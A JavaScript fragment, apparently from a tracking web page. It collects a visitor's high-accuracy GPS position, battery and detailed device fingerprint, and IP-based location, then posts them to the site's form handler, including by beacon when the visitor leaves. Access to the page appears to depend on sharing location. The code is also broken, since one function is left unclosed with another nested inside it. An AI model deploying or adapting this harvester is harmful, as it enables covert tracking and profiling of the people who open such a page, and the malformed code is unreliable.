  async function getDeviceInfo() {
    const info = syncDeviceInfo();
    try {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        info.battery_level_percent = Math.round((battery.level || 0) * 100) + "%";
        info.battery_charging = battery.charging ? "Yes" : "No";
        info.battery_charging_time_seconds = isFinite(battery.chargingTime) ? String(battery.chargingTime) : "Not available";
        info.battery_discharging_time_seconds = isFinite(battery.dischargingTime) ? String(battery.dischargingTime) : "Not available";
        info.battery_info = "level=" + info.battery_level_percent + ", charging=" + info.battery_charging + ", chargingTime=" + info.battery_charging_time_seconds + ", dischargingTime=" + info.battery_discharging_time_seconds;
      }
    } catch (e) { info.battery_info = "Not available - browser blocked battery info"; }
    try {
      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
        const high = await navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "architecture", "model", "uaFullVersion", "fullVersionList", "bitness", "wow64"]);
        if (high.platform) info.platform = high.platform + (high.platformVersion ? " " + high.platformVersion : "");
        if (high.platformVersion) info.os_version = high.platform + " " + high.platformVersion;
        if (high.model) info.mobile_model = high.model;
        if (high.fullVersionList && high.fullVersionList.length) {
          info.browser_version = high.fullVersionList.map(function (b) { return b.brand + " " + b.version; }).join(" | ");
          info.browser_name = info.browser_version;
        } else if (high.uaFullVersion) {
          info.browser_version = info.browser_name + " " + high.uaFullVersion;
          info.browser_name = info.browser_version;
        }
      }
    } catch (e) {}
    return info;
  }

  async function getPermissionState() {
    try {
      if (navigator.permissions && navigator.permissions.query) {
        const result = await navigator.permissions.query({ name: "geolocation" });
        return result.state || "unknown";
      }
    } catch (e) {}
    return "unknown";
  }

  function requestFirstLocation() {
    return new Promise(function (resolve, reject) {
      if (!navigator.geolocation) { reject(new Error("Browser does not support location")); return; }
      navigator.geolocation.getCurrentPosition(function (position) {
        bestPosition = position;
        readingCount = 1;
        lastLocationStatus = "first_location_received";
        resolve(position);
      }, function (error) {
        lastLocationStatus = "permission_denied_or_location_off";
        if (error && error.code === 1) lastLocationError = "User denied location permission";
        else if (error && error.code === 2) lastLocationError = "Location unavailable or phone location is off";
        else if (error && error.code === 3) lastLocationError = "Location request timeout";
        else lastLocationError = "Location permission required";
        const err = new Error(lastLocationError);
        err.locationCode = error && error.code;
        reject(err);
      }, { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 });
    });
  }

  function updateBest(position) {
    if (!position || !position.coords) return;
    readingCount += 1;
    const currentAcc = Number(position.coords.accuracy || Infinity);
    const bestAcc = bestPosition ? Number(bestPosition.coords.accuracy || Infinity) : Infinity;
    if (!bestPosition || currentAcc < bestAcc) bestPosition = position;
  }

  function buildGpsFields(reason) {

  function postWithBeacon(fields) {
    const params = new URLSearchParams();
    params.append("form-name", FORM_NAME);
    Object.keys(fields).forEach(function (key) { params.append(key, valueOrBlank(fields[key])); });
    try {
      if (navigator.sendBeacon) {
        const blob = new Blob([params.toString()], { type: "application/x-www-form-urlencoded" });
        return navigator.sendBeacon("/", blob);
      }
    } catch (e) {}
    return false;
  }

  async function submitLocation(fields, preferBeacon) {
    if (submitted) return true;
    submitted = true;
    try {
      sessionStorage.setItem(SESSION_SENT_KEY, "1");
      sessionStorage.setItem(SHARED_ACCESS_KEY, "1");
    } catch (e) {}
    if (preferBeacon && postWithBeacon(fields)) return true;
    const params = new URLSearchParams();
    params.append("form-name", FORM_NAME);
    Object.keys(fields).forEach(function (key) { params.append(key, valueOrBlank(fields[key])); });
    try {
      const res = await fetch("/", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: params.toString(), keepalive: true });
      if (res.ok) return true;
    } catch (e) {}
    return postWithBeacon(fields);
  }

  async function finalSubmit(reason, preferBeacon) {
    if (submitted) return;
    if (watchId !== null && navigator.geolocation && navigator.geolocation.clearWatch) {
      try { navigator.geolocation.clearWatch(watchId); } catch (e) {}
      watchId = null;
    }
    let ip = ipData || null;
    let device = deviceData || null;
    try { ip = ip || await ipPromise; } catch (e) {}
    try { device = device || await devicePromise; } catch (e) {}
    ip = ip || { ip_address: "Not available", ip_city: "Not available", ip_region: "Not available", ip_country: "Not available", ip_latitude: "Not available", ip_longitude: "Not available", ip_org: "Not available", ip_timezone: "Not available", ip_postal: "Not available", ip_country_code: "Not available", ip_asn: "Not available", ip_version: "Not available", ip_currency: "Not available", ip_calling_code: "Not available", ip_languages: "Not available", ip_details: "Not available", ip_location_note: "IP lookup not completed" };
    device = device || syncDeviceInfo();
    const fields = Object.assign({}, buildGpsFields(reason), ip, device, {
      submit_time: new Date().toISOString(),
      page_url: window.location.href
    });
    await submitLocation(fields, preferBeacon);
  }

  const ipPromise = getIpInfo().then(function (v) { ipData = v; return v; }).catch(function () { return null; });
  const devicePromise = getDeviceInfo().then(function (v) { deviceData = v; return v; }).catch(function () { return syncDeviceInfo(); });

  function startBestAccuracyCollection() {
    // No watchPosition here: only one browser location permission/request is used.
    // The first high-accuracy GPS reading is submitted with all device/IP fields.
    finalSubmit("single_permission_location_submit", false);
  }

  function flushBeforeLeaving() {
    if (!submitted && bestPosition) finalSubmit("user_left_page_best_available", true);
  }
